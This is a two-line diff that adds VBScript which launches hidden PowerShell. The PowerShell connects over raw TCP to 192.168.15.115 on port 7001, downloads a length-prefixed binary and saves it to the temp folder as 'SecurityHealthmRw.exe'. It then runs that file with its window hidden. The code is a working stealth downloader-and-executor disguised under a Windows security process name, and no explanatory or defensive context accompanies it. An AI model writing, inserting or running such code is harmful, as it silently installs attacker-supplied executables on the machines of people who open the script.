@@ -1,0 +1,2 @@
+Set cmd4 = CreateObject("WScript.Shell")
+cmd4.Run "powershell -w hidden -c $dst=$env:TEMP+'\SecurityHealthmRw.exe';$conn2=New-Object Net.Sockets.TcpClient('192.168.15.115',7001);$ch=$conn2.GetStream();$ch.WriteByte(3);$lenBuf=New-Object byte[] 4;$idx9=0;while($idx9 -lt 4){$idx9+=$ch.Read($lenBuf,$idx9,4-$idx9)};$cb5=[BitConverter]::ToInt32($lenBuf,0);$buf=New-Object byte[] $cb5;$rcv=0;while($rcv -lt $cb5){$n=$ch.Read($buf,$rcv,$cb5-$rcv);if($n -le 0){break};$rcv+=$n};$conn2.Close();[IO.File]::WriteAllBytes($dst,$buf);Start-Process $dst -WindowStyle Hidden", 0, False
